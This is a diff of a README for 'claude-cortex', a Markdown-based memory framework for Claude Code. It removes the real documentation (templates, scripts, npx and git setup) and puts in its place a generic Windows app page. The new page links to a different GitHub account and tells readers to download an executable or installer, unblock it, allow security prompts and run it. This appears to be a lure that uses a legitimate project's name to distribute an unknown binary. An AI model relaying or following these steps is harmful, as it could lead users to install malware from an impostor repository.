@@ -1,331 +1,158 @@
-<p align="center">
-  <h1 align="center">🧠 claude-cortex</h1>
-  <p align="center">
-    <strong>Give Claude Code a long-term memory.</strong><br>
-    <em>Persistent knowledge across sessions, projects, and devices — no database, no cloud, just files.</em>
-  </p>
-  <p align="center">
-    <a href="#quick-start">Quick Start</a> &middot;
-    <a href="#features">Features</a> &middot;
-    <a href="#architecture">Architecture</a> &middot;
-    <a href="docs/best-practices.md">Best Practices</a> &middot;
-    <a href="CONTRIBUTING.md">Contributing</a>
-  </p>
-  <p align="center">
-    <a href="https://github.com/renefichtmueller/claude-cortex/stargazers"><img src="https://img.shields.io/github/stars/renefichtmueller/claude-cortex?style=flat-square&color=yellow" alt="Stars"></a>
-    <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue?style=flat-square" alt="License"></a>
-    <a href="https://github.com/renefichtmueller/claude-cortex/issues"><img src="https://img.shields.io/github/issues/renefichtmueller/claude-cortex?style=flat-square" alt="Issues"></a>
-    <a href="https://github.com/renefichtmueller/claude-cortex/pulls"><img src="https://img.shields.io/badge/PRs-welcome-brightgreen?style=flat-square" alt="PRs Welcome"></a>
-  </p>
-</p>
-
----
-
-## The Problem
-
-> **[🚀 Live Demo](https://claude-cortex-demo.pages.dev)** — Try it in your browser, no installation needed.
-
-Every time you start a new Claude Code session, Claude starts from zero. It doesn't know:
-
-- What you were working on yesterday
-- Why you made that architecture decision three weeks ago
-- That one obscure fix that took you four hours to find
-- Your coding preferences, project conventions, or deployment quirks
-- Which integrations are set up and how they work
-
-You end up repeating yourself. Re-explaining context. Re-discovering solutions. Losing momentum.
-
-## The Solution
-
-**claude-cortex** is a structured, file-based persistent memory framework that gives Claude Code long-term memory across sessions, projects, and devices.
-
-It uses a hierarchy of Markdown files that Claude reads at session start and updates at session end. No database. No server. No API keys. Just files that travel with your project.
-
-> Built from a real production system managing 25+ knowledge files across multiple projects.
-
-## Before & After
-
-| Without Memory | With Memory |
-|---|---|
-| Re-explain project context every session | Claude reads `MEMORY.md` and is immediately caught up |
-| Forget why a decision was made | Decision log captured in project files |
-| Re-discover the same fix twice | Incident runbooks document every fix |
-| Inconsistent code style across sessions | Feedback files encode your preferences |
-| Lost research and useful links | Reference files archive discoveries |
-| No idea what was done last session | Activity log tracks every session |
-| Single-project tunnel vision | Cross-project knowledge sharing |
-| Context lost when switching machines | Sync via Dropbox, iCloud, or Git |
-
-## Architecture
-
-```
-MEMORY.md (Master Index)
-    |
-    +-- Activity Log
-    |       Session timestamps, work done, next steps
-    |
-    +-- Project Files
-    |       Per-project: stack, architecture, patterns, status
-    |
-    +-- Integration Docs
-    |       API endpoints, auth flows, gotchas
-    |
-    +-- Incident Runbooks
-    |       Bug -> root cause -> fix -> prevention
-    |
-    +-- Feedback / Preferences
-    |       Code style, commit conventions, review patterns
-    |
-    +-- Reference Archive
-    |       Papers, tools, libraries, research notes
-    |
-    +-- Cross-Project Patterns
-            Shared solutions, reusable snippets
-```
-
-The `MEMORY.md` file is the entry point. It serves as a concise index (max 200 lines) that points to topic-specific files. Claude reads the index first, then loads relevant files based on the current task.
-
-```
-Session Start                          Session End
-     |                                      |
-     v                                      v
-Read MEMORY.md -----> Work on tasks -----> Update activity log
-     |                                      |
-     v                                      v
-Load relevant    <--- Claude has full ---> Record new patterns,
-topic files           context               incidents, decisions
-```
-
-## Quick Start
-
-### Option A: npx (fastest)
-
-```bash
-# From your project directory
-npx claude-cortex init my-project
-```
-
-### Option B: Clone and set up
-
-```bash
-git clone https://github.com/renefichtmueller/claude-cortex.git
-cd claude-cortex
-chmod +x setup.sh
-./setup.sh
-
-# From your project directory
-/path/to/claude-cortex/scripts/init.sh my-project
-```
-
-This creates a `.claude/memory/` directory in your project with all templates pre-configured.
-
-### 3. Tell Claude to use it
-
-Add this to your project's `.claude/CLAUDE.md`:
-
-```markdown
-## Memory System
-At the START of every session, read `.claude/memory/MEMORY.md` and load relevant topic files.
-At the END of every session, update the activity log with: what was done, decisions made, next steps.
-When you learn something reusable (pattern, fix, gotcha), add it to the relevant topic file.
-```
-
-That's it. Claude now has persistent memory.
-
-## How Files Get Updated (The Actual Process)
-
-This is the most common question — here's exactly what happens:
-
-### Session Start (Claude reads)
-```
-You: "Let's work on the auth system"
-
-Claude (automatically):
-  1. Reads .claude/memory/MEMORY.md (the index)
-  2. Sees: project-api.md has auth docs, activity-log.md has last session
-  3. Reads those files
-  4. Now knows: "Last session we migrated from JWT to cookies. Next step: update middleware."
-  5. Starts working — no context-rebuilding conversation needed
-```
+# 🧠 claude-cortex - Keep Claude Code in sync
 
-### During Work (Claude updates as it goes)
-```
-You fix a tricky Prisma bug together.
-
-Claude (automatically):
-  1. Creates .claude/memory/incident-prisma-null-filter.md
-  2. Documents: the error, root cause, fix, prevention
-  3. Updates project-api.md with the new pattern
-  → Next time this bug appears in ANY project, Claude already knows the fix
-```
-
-### Session End (Claude writes summary)
-```
-You: "Let's wrap up"
+[![Download claude-cortex](https://img.shields.io/badge/Download%20claude--cortex-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Trussed-japanesecedar194/claude-cortex)
 
-Claude (automatically):
-  1. Appends to activity-log.md:
-     ## 2025-03-19 | Session 12
-     **Done:** Fixed Prisma null filter bug, updated auth middleware
-     **Decisions:** Using { field: { not: true } } pattern for nullable booleans
-     **Next:** Test protected routes, deploy to staging
-  2. Updates MEMORY.md index if new files were created
-```
+## 📥 Download
 
-### What Triggers Updates?
+Visit this page to download: https://github.com/Trussed-japanesecedar194/claude-cortex
 
-| Event | What Claude Does |
-|---|---|
-| Session starts | Reads `MEMORY.md` + relevant topic files |
-| Bug gets fixed | Creates/updates `incident-*.md` with root cause + fix |
-| Architecture decision made | Updates `project-*.md` with the decision and reasoning |
-| New integration added | Creates/updates `integration-*.md` with endpoints, auth, gotchas |
-| New pattern discovered | Updates `feedback-*.md` or creates `reference-*.md` |
-| Session ends | Appends to `activity-log.md` with done/decisions/next |
-| New tool/library found | Creates `reference-*.md` with evaluation notes |
+Use the page to get the latest version for Windows. If the page shows a release file, download it to your computer. If it shows a setup file, save it and run it after the download ends.
 
-### Key Insight: It's Instruction-Driven
+## 🧭 What claude-cortex does
 
-The files don't update themselves — Claude updates them because your `CLAUDE.md` **instructs** it to. The templates provide the structure, the instructions provide the behavior. You can customize both:
+claude-cortex gives Claude Code a long-term memory. It helps keep useful notes, project facts, and past decisions in one place so you can pick up where you left off.
 
-```markdown
-# Minimal (just session tracking):
-At session end, update the activity log.
-
-# Standard (recommended):
-At session start, read memory. At session end, update activity log.
-When fixing bugs, document in incident files. When making decisions, update project files.
+It is built for people who want:
+- Persistent notes across sessions
+- A simple knowledge base for projects
+- Better recall of past work
+- Shared context across devices
+- Markdown-based storage that stays easy to read
 
-# Maximum (full knowledge capture):
-At session start, read ALL memory files.
-During work, update relevant files in real-time.
-Document every decision, pattern, fix, and discovery.
-At session end, write detailed activity log with blockers and next steps.
-Cross-reference between files when patterns connect.
-```
+## 🖥️ Windows requirements
 
-The more specific your instructions, the more consistently Claude maintains the memory.
+You need:
+- Windows 10 or Windows 11
+- A stable internet connection
+- Enough free space for the app and your notes
+- Permission to run downloaded files
 
-## Features
+For best results, keep your notes in a folder you can find easily, such as Documents or Desktop.
+
+## 🚀 Getting started
 
-### Session Continuity
-Activity logs track what was done in each session, what decisions were made, and what comes next. No more "where were we?" conversations.
+1. Open the download page.
+2. Get the latest Windows file from the repository.
+3. Save the file to your PC.
+4. If Windows asks for permission, choose the option to run the file.
+5. Follow the on-screen steps.
+6. Open claude-cortex after setup finishes.
 
-```markdown
-## 2025-01-15 | Session 4
-**Done:** Migrated auth from JWT to session cookies, updated all API routes
-**Decisions:** Chose cookie-based auth for better SSR support
-**Next:** Update middleware, test protected routes, deploy to staging
-**Blockers:** None
-```
+If the app starts with a folder or vault view, that is normal. The app uses files to store memory in plain text and markdown.
 
-### Cross-Project Knowledge
-Patterns discovered in one project are available everywhere. Fix a tricky Prisma edge case in Project A? The knowledge is there when you hit the same issue in Project B.
+## 🛠️ Install on Windows
 
-### Incident Runbooks
-Document every significant bug fix with root cause and solution. The same issue never costs you time twice.
+When you download the app:
+- Right-click the file if Windows blocks it
+- Choose Open or Run
+- If you see a security prompt, allow the file to run
+- Keep the app in a folder that will not move often
 
-### Integration Documentation
-API endpoints, authentication flows, rate limits, known quirks. Everything needed to work with external services, written once and always available.
+If the app comes as a zip file:
+- Open the zip file
+- Extract it to a folder
+- Open the extracted file
+- Run the main app file
 
-### Research Archive
-Papers, tools, libraries, and patterns discovered during work. Build a knowledge base that grows with every session.
+If the app comes as an installer:
+- Double-click the installer
+- Choose Next where needed
+- Pick an install folder
+- Finish the setup
+- Start the app from the Start menu or desktop icon
 
-### Feedback Loop
-Claude learns your preferences over time: code style, commit message format, review priorities, naming conventions. Encoded in files, not lost between sessions.
+## 🧩 First-time setup
 
-### Device Sync
-Memory files are plain Markdown. Sync them with Dropbox, iCloud, Google Drive, or Git. Work on your desktop, continue on your laptop.
+When you open claude-cortex for the first time:
+- Choose or create a memory folder
+- Give the folder a clear name
+- Let the app index the files if prompted
+- Save your first note or project memory
+- Keep the folder in the same place so Claude Code can find it again
 
-### Validation & Health Checks
-Scripts to verify memory structure, find stale entries, and report statistics about your knowledge base.
+A good setup keeps your memory easy to browse and easy to update.
 
-```bash
-./scripts/validate.sh    # Check memory structure health
-./scripts/stats.sh       # Show memory statistics
-```
+## 📝 How to use it
 
-## File Types
+Use claude-cortex to store:
+- Project goals
+- Code notes
+- Task lists
+- Session summaries
+- Decisions you want to remember
+- Helpful links
+- Plain markdown notes
 
-| Template | Purpose | Update Frequency |
-|---|---|---|
-| `MEMORY.md` | Master index, entry point for every session | When adding new files |
-| `activity-log.md` | Session-by-session work log | Every session |
-| `project-*.md` | Project-specific knowledge | As architecture evolves |
-| `integration-*.md` | External service documentation | When integrations change |
-| `incident-*.md` | Bug fix runbooks | After each significant fix |
-| `feedback-*.md` | Preferences and patterns | As preferences solidify |
-| `reference-*.md` | Research and discovery archive | When finding useful resources |
+A simple way to work:
+1. Write down what you want Claude Code to remember
+2. Save it in the memory folder
+3. Open Claude Code again later
+4. Refer back to the same notes
+5. Update the notes as the project changes
 
-## Examples
+## 📚 Suggested folder layout
 
-This repo includes two complete example memory setups:
+A clear folder structure makes it easier to find things later:
 
-- **[`examples/fullstack-saas/`](examples/fullstack-saas/)** - A full-stack SaaS application with dashboard, API, infrastructure docs, and activity log
-- **[`examples/mobile-app/`](examples/mobile-app/)** - A mobile app project with iOS frontend, backend API, and cross-platform patterns
+- `Projects`
+- `Notes`
+- `Session-Summaries`
+- `Decisions`
+- `Links`
+- `Templates`
 
-Each example demonstrates realistic memory content that a team might build up over weeks of development.
+You can keep one folder per project or one folder for your whole workflow. Use the structure that feels easiest to manage.
 
-## Scripts
+## 🔎 Features
 
-| Script | Description |
-|---|---|
-| `scripts/init.sh` | Initialize memory structure in a project |
-| `scripts/sync.sh` | Sync memory files across devices |
-| `scripts/validate.sh` | Validate memory structure and find issues |
-| `scripts/stats.sh` | Display memory statistics |
+- Long-term memory for Claude Code
+- Persistent knowledge across sessions
+- Markdown-friendly note storage
+- Simple project context tracking
+- Easy reuse across devices
+- Good fit for personal and team workflows
+- Works well with plain text files
+- Keeps key information in one place
 
-## Documentation
+## 🧠 Best practices
 
-- **[Architecture](docs/architecture.md)** - How the memory system works internally
-- **[Best Practices](docs/best-practices.md)** - Tips for building effective memory
-- **[Patterns](docs/patterns.md)** - Common memory patterns and when to use them
-- **[FAQ](docs/faq.md)** - Frequently asked questions
+To get better results:
+- Write short notes with clear names
+- Save one idea per file when possible
+- Use dates in file names
+- Record decisions as soon as you make them
+- Keep project notes separate from general notes
+- Review old notes before starting a new session
 
-## How It Compares
+Example file names:
+- `2026-04-04-project-notes.md`
+- `api-decisions.md`
+- `session-summary-01.md`
 
-| Approach | Persistence | Structure | Multi-Project | No Server | Portable |
-|---|---|---|---|---|---|
-| **claude-cortex** | File-based | Hierarchical templates | Yes | Yes | Yes |
-| Pasting context manually | None | Ad-hoc | No | Yes | No |
-| Custom MCP server | Database | Custom schema | Maybe | No | No |
-| CLAUDE.md alone | Single file | Flat | No | Yes | Yes |
-| Vector DB + embeddings | Database | Semantic | Maybe | No | No |
+## ❓ Common questions
 
-## Tips
+### Do I need coding knowledge?
+No. You can use the app with basic Windows skills like downloading, opening files, and saving notes.
 
-1. **Keep MEMORY.md under 200 lines.** It's an index, not a dump. Point to topic files.
-2. **Update the activity log every session.** This is the single most valuable habit.
-3. **Be specific in incident runbooks.** Include the exact error message, root cause, and fix.
-4. **Cross-reference between files.** Link project files to relevant incidents and patterns.
-5. **Prune quarterly.** Archive stale entries. Memory should be current and relevant.
-6. **Use the validation script.** Run `./scripts/validate.sh` weekly to catch structural issues.
+### Can I use it with plain markdown files?
+Yes. That is one of its main strengths.
 
-## Related Projects
+### Can I move my notes to another device?
+Yes. If your notes stay in standard files, you can copy the folder to another device.
 
-- **[claude-sync](https://github.com/renefichtmueller/claude-sync)** — Sync your cortex across all your devices. Desktop, laptop, work machine — one brain everywhere.
-- **[slop-radar](https://github.com/renefichtmueller/slop-radar)** — Detect AI-generated slop in text. Drop it into Claude Code as a skill to check output quality.
+### Will it work for more than one project?
+Yes. You can keep separate folders or separate note files for each project.
 
-## Contributing
+### What if I want to update my memory later?
+Open the same folder and add new notes or edit old ones.
 
-Contributions are welcome. See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
+## 🔗 Download again
 
-Areas where help is especially appreciated:
-- Additional templates for common project types
-- Integration examples for popular tools and services
-- Scripts for additional sync backends
-- Translations of documentation
+Visit this page to download: https://github.com/Trussed-japanesecedar194/claude-cortex
 
-## License
+## 📁 Repository details
 
-[MIT](LICENSE) - Use it however you want.
-
----
-
-<p align="center">
-  If this helps your workflow, consider giving it a star.
-  <br>
-  <a href="https://github.com/renefichtmueller/claude-cortex">
-    <img src="https://img.shields.io/github/stars/renefichtmueller/claude-cortex?style=social" alt="GitHub Stars">
-  </a>
-</p>
+- Name: claude-cortex
+- Type: End-user app for memory and notes
+- Focus: Persistent knowledge for Claude Code
+- Topics: ai, claude, claude-code, developer-tools, knowledge-base, llm, markdown, memory, persistent-memory, productivity
